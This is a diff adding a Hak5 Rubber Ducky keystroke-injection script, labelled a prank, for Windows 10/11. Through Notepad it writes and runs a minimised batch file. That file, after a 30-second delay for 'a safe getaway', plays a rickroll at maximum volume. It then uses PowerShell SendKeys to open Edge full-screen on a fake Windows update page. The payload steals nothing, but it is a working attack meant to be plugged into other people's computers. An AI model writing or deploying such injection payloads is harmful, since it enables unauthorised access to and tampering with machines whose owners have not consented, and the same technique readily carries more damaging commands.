@@ -1,0 +1,117 @@
+REM Author: victor-a-c
+REM Title: silent_rickroll
+REM Target: Windows10/11
+REM Props: Hak5
+REM Version: 2.0
+REM Category: Prank
+
+REM Description:
+REM the payload sets volume to maximum
+REM creates batch file with delay which will run while the prompt window is minimized
+REM after the first delay ends Never Gonna Give You Up starts playing on default browser
+REM a few seconds later it opens edge (present in all windows computers) and opens fake windows update on full screen
+REM "GUI SPACE" works for computers with locked prompts, which allows for program search
+REM "GUI r" should be used for regular computers
+
+REM set volume to max as fast as possible
+DELAY 2000
+GUI
+DELAY 500
+STRING adjust volume
+DELAY 100
+ENTER
+DELAY 1000
+TAB
+REPEAT 10
+DELAY 1000
+RIGHTARROW
+REPEAT 120
+DELAY 100
+ALT F4
+
+DELAY 1500
+REM creates batch file
+GUI
+DELAY 100
+SPACE
+DELAY 1000
+STRING notepad
+DELAY 500
+ENTER
+DELAY 1000
+REM batch file commands
+REM uses just "start" batch command to open website on default browser
+REM double quotes after "start" are necessary for the command to work
+REM Batch file will run while minimized
+STRING if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+DELAY 100
+ENTER
+REM batch delay for when "Never Gonna Give You Up" will start being played
+REM enough time for the ducky to be removed after the script is executed and allow for a safe getaway
+STRING TIMEOUT /T 30
+DELAY 500
+ENTER
+REM on default browser
+STRING START "" https://www.youtube.com/watch?v=xm3YgoEiEDc
+DELAY 10
+ENTER
+STRING TIMEOUT /T 3
+ENTER
+DELAY 500
+REM Opens microsoft edge, opens fake windows update and sets it full screen
+STRING Powershell -command "$wshell = New-Object -ComObject wscript.shell;[system.Diagnostics.Process]::Start(\"msedge\",\"about:blank\");Sleep 1;$wshell.SendKeys('^"{l}"');Sleep 1;$wshell.SendKeys('https://fakeupdate.net/win10ue/');$wshell.SendKeys('"{Enter}"');$wshell.SendKeys('"{F11}"')"
+ENTER
+STRING exit
+DELAY 1000
+REM save as
+ALT F
+DOWNARROW
+REPEAT 3
+DELAY 100
+ENTER
+STRING sr.bat
+DELAY 500
+TAB
+DELAY 100
+DOWNARROW
+REPEAT 1
+ENTER
+REM
+REM unfortunately "TAB REPEAT 9" causes the script to get stuck to file explorer's search bar
+REM splitting the repeat and adding delays between them did not solve it
+REM
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+REM selects documents folder
+DELAY 200
+STRING doc
+ENTER
+DELAY 1000
+ALT F4
+
+
+DELAY 500
+REM execute the batch file
+GUI
+DELAY 500
+SPACE
+STRING sr.b
+DELAY 500
+STRING at
+DELAY 1000
+ENTER
